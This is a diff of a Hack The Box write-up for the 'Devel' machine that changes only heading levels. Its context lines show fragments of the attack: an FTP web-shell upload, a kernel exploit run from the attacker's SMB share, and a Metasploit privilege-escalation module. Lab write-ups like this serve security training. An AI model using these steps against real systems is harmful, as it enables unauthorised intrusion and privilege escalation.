@@ -13,11 +13,11 @@ mermaid: true
 
 This writeup is based on Devel on Hack the box.
 
-# TL;DR
+## TL;DR
 
 This writeup is based on [__Devel__](https://www.hackthebox.eu/home/machines/profile/3) which is an easy-rated machine on HackTheBox. It starts with FTP and HTTP. I will use FTP anonymous login to upload a webshell to get shell on the machine. Later on, I’ll use one of many Windows kernel exploit to gain system shell. It requires some basic privilege escalation for the root flag.
 
-# Scanning Network
+## Scanning Network
 
 I will start with Nmap scan to find the open ports and services active on machine. I found FTP and HTTP open on 21 and 80 respectively. By using Banner Grabbing, we will able to get the version of FTP and HTTP. Let’s see the nmap result.
 
@@ -45,7 +45,7 @@ nmap -sC -sV -oA intense 10.129.152.23
 
 As we found the version of FTP and HTTP. First, we will enumerate HTTP. Let’s jump into it in enumeration phase.
 
-# Enumeration
+## Enumeration
 
 Let’s see the IP on the browser.
 
@@ -102,9 +102,9 @@ ftp 10.129.152.23
  32 bytes sent in 0.00 secs (1.0523 MB/s)
  ```
 
-# Devel Writeup Exploitation (Without Metasploit)
+## Exploitation (Without Metasploit)
 
-## FTP Exploitation (File Upload)
+### FTP Exploitation (File Upload)
 
 We successfully uploaded our test file to the machine. Now, we can upload a simple web shell to the machine. If you search for web shells on Google, you will get tons of shells. I like to use web shell from [__SecLists__](https://github.com/danielmiessler/SecLists). Later on we will visit to <ip address>/cmd.aspx.
 
@@ -184,7 +184,7 @@ As you can see we have access denied to the users. So we have to get the system 
 
 Now, we have to use exploit suggestor as WinPEAS, Watson or msfconsole’s local-exploit-suggestor. I will be using watson to see the suggested exploits.
 
-## Privilege Escalation (Using Watson)
+### Privilege Escalation (Using Watson)
 
 I already transferred the Watson.exe to the target system using smbserver. If you want to download Watson.exe, then visit [__Watson__](https://github.com/rasta-mouse/Watson) .
 
@@ -244,7 +244,7 @@ c:\Users>\\10.10.14.61\share\MS11-046.exe
  c:\Windows\System32>
 ```
 
-# Devel Writeup Exploitation (With Metasploit)
+## Exploitation (With Metasploit)
 
 We have to create a payload using msfvenom to upload in the machine using <b>ftp</b>.
 
@@ -366,7 +366,7 @@ msf6 exploit(windows/local/ms10_015_kitrap0d) > set SESSION 2
 
 As we saw in the manual exploitation part, before privilege escalation, we don’t have access to the user as well as to root flag. Once we escalated the privileges, we have access to user.txt and root.txt
 
-## Devel Writeup: User
+### Devel Writeup: User
 
 We get the user babis. We get the user flag.
 
@@ -377,7 +377,7 @@ c:>cd Users/babis/Desktop
  c:\Users\babis\Desktop>
 ```
 
-## Devel Writeup: Root
+### Devel Writeup: Root
 
 We can now read the root flag.
 
